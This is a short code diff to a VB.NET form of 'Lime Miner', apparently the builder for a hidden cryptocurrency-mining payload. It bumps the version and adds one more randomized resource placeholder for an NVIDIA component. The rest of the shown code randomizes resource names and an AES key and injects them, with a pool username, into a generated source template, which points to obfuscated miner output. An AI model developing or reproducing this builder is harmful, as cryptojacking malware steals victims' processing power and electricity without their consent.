@@ -41,7 +41,7 @@ Public Class Form1
 
     Private Sub BackgroundWorker1_DoWork(sender As Object, e As System.ComponentModel.DoWorkEventArgs) Handles BackgroundWorker1.DoWork
         Try
-            HuraForm1.Text = "Lime Miner v0.3 @" + Environment.UserName
+            HuraForm1.Text = "Lime Miner v0.3.2 @" + Environment.UserName
         Catch ex As Exception
         End Try
 
@@ -89,6 +89,7 @@ Public Class Form1
     Public Resources_dll = Randomi(rand.Next(5, 10))
     Public Resources_cpu = Randomi(rand.Next(5, 10))
     Public Resources_nvidia = Randomi(rand.Next(5, 10))
+    Public Resources_nvidia9 = Randomi(rand.Next(5, 10))
     Public Resources_amd = Randomi(rand.Next(5, 10))
     Public Resources_Parent = Randomi(rand.Next(5, 10))
     Public AESKEY As String = Randomi(rand.Next(5, 10))
@@ -102,6 +103,7 @@ Public Class Form1
             Source = Replace(Source, "#dll", Resources_dll)
             Source = Replace(Source, "#cpu", Resources_cpu)
             Source = Replace(Source, "#nvidia", Resources_nvidia)
+            Source = Replace(Source, "#nvidia9", Resources_nvidia9)
             Source = Replace(Source, "#amd", Resources_amd)
             Source = Replace(Source, "#ParentRes", Resources_Parent)
             Source = Replace(Source, "#USER", txtPoolUsername.Text)
